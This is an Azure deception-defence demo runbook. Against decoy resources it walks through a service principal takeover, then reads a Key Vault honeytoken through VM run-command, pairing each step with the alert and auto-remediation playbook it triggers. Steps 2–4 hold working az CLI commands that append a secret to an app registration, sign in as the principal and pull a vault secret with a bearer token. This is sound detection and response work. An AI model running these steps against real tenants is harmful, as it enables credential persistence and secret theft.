# Demo: SP takeover → read the Key Vault honeytoken → auto-remediation

## Operator prep (before recording)
Enable the two playbooks:
```bash
az resource update -g rg-core-ops-weu -n logic-core-ops-weu-01 --resource-type Microsoft.Logic/workflows --set properties.state=Enabled -o none
az resource update -g rg-core-ops-weu -n logic-core-ops-weu-02 --resource-type Microsoft.Logic/workflows --set properties.state=Enabled -o none
```
Clear any leftover isolation lock from a previous run:
```bash
az account set -s "$(jq -r .network.honeypotSubscriptionId inventory/decoy-inventory.json)"
az lock list -g rg-core-prod-weu -o table
# if a 'honeypot-isolation' lock exists, delete it by its exact id:
az lock delete --ids "$(az lock list -g rg-core-prod-weu -o tsv --query "[?name=='honeypot-isolation'].id | [0]")"
```

## 0. Setup (read decoy IDs from the inventory)
```bash
INV=inventory/decoy-inventory.json
SUB=$(jq -r .network.honeypotSubscriptionId "$INV")
TENANT=$(jq -r .tenantId "$INV")
APP_ID=$(jq -r .identity.reachableApp.appId "$INV")
SP_OID=$(jq -r .identity.reachableApp.spObjectId "$INV")
RG=$(basename "$(jq -r .network.honeypotResourceGroupId "$INV")")
KV=$(basename "$(jq -r .network.keyVaultId "$INV")")
VM=$(basename "$(jq -r .network.decoyVmId "$INV")")
```

## 1. Connect as the foothold
```bash
export AZURE_CONFIG_DIR=~/.az-attacker
az login --allow-no-subscriptions
az ad signed-in-user show --query userPrincipalName -o tsv
```
No alert.

## 2. Take over the SP — add a secret to the owned app
```bash
AZURE_CONFIG_DIR=~/.az-attacker az ad app credential reset --id "$APP_ID" --append --years 1
# note the printed "password"
```
- **Alert:** *credential added to decoy service principal/app* (High)
- **Playbook:** disable-user → no-op (initiator is `attacker-test`, not a decoy)

## 3. Sign in as the SP (MFA-immune)
```bash
AZURE_CONFIG_DIR=~/.az-sp az login --service-principal \
  -u "$APP_ID" -p '<password>' --tenant "$TENANT" --allow-no-subscriptions
```
- **Alert:** *sign-in as decoy service principal* (High)
- **Playbook:** disable-user → **disables the SP** (~10 min later)

## 4. Read the Key Vault honeytoken (through the private endpoint, from the VM)
The KV is private-only, so loot it from inside the spoke. The SP is Owner of the RG, so it starts
the VM itself, then reads the secret with a vault token via run-command:
```bash
AZURE_CONFIG_DIR=~/.az-sp az vm start -g "$RG" -n "$VM"
# ~1-2 min

KV_TOKEN=$(AZURE_CONFIG_DIR=~/.az-sp az account get-access-token \
  --resource https://vault.azure.net --query accessToken -o tsv)

AZURE_CONFIG_DIR=~/.az-sp az vm run-command invoke -g "$RG" -n "$VM" \
  --command-id RunShellScript --scripts \
  "curl -s -H 'Authorization: Bearer $KV_TOKEN' 'https://$KV.vault.azure.net/secrets/github-actions-pat?api-version=7.4'"
```
The response body contains the decoy GitHub PAT in its `"value"` field (inert honeytoken).
- **Alert:** *decoy Key Vault secret accessed* (High)
- **Playbook:** isolate-resource → **ReadOnly-locks the Key Vault**

## 5. Verify remediation (as operator/admin)
```bash
# SP disabled by disable-user
az ad sp show --id "$APP_ID" --query accountEnabled -o tsv
# false

# Key Vault locked by isolate-resource
az lock list -g "$RG" -o table
# honeypot-isolation (ReadOnly)

# incidents, newest first
WS=$(az monitor log-analytics workspace show -g rg-core-ops-weu -n log-core-ops-weu --query customerId -o tsv)
az monitor log-analytics query -w "$WS" --analytics-query \
 'SecurityIncident | summarize arg_max(TimeGenerated,*) by IncidentNumber | where Title has "Honeypot" | project IncidentNumber, Severity, Status, Title | order by IncidentNumber desc' -o table
```
Portal: **Defender → Investigation & response → Incidents** (filter `Honeypot`). Open each incident →
the disable-user/​isolate-resource run and its comment appear under **Activity log / Comments**.

## Alerts generated (in order)
| Step | Action | Alert (High) | Playbook | Result |
|---|---|---|---|---|
| 2 | add secret to owned app | credential added to decoy SP/app | disable-user | no-op (attacker not a decoy) |
| 3 | sign in as the SP | sign-in as decoy service principal | disable-user | SP disabled |
| 4 | read KV honeytoken | decoy Key Vault secret accessed | isolate-resource | Key Vault locked |

`attacker-test` is **never** disabled — the two-key guard only acts on the decoy SP and locks the
decoy Key Vault. Latency: ~5–30 min ingest + 5-min rule cycle, so remediation lands ~10 min after
each alert. Do steps 2→4 back-to-back, then wait and show step 5.

## Reset for a re-run
```bash
az account set -s "$SUB"
# re-enable the SP (Graph PATCH by SP OBJECT id)
az rest --method PATCH --url "https://graph.microsoft.com/v1.0/servicePrincipals/$SP_OID" --body '{"accountEnabled": true}'
# remove the isolation lock
az lock delete --ids "$(az lock list -g "$RG" -o tsv --query "[?name=='honeypot-isolation'].id | [0]")"
rm -rf ~/.az-attacker ~/.az-sp
```
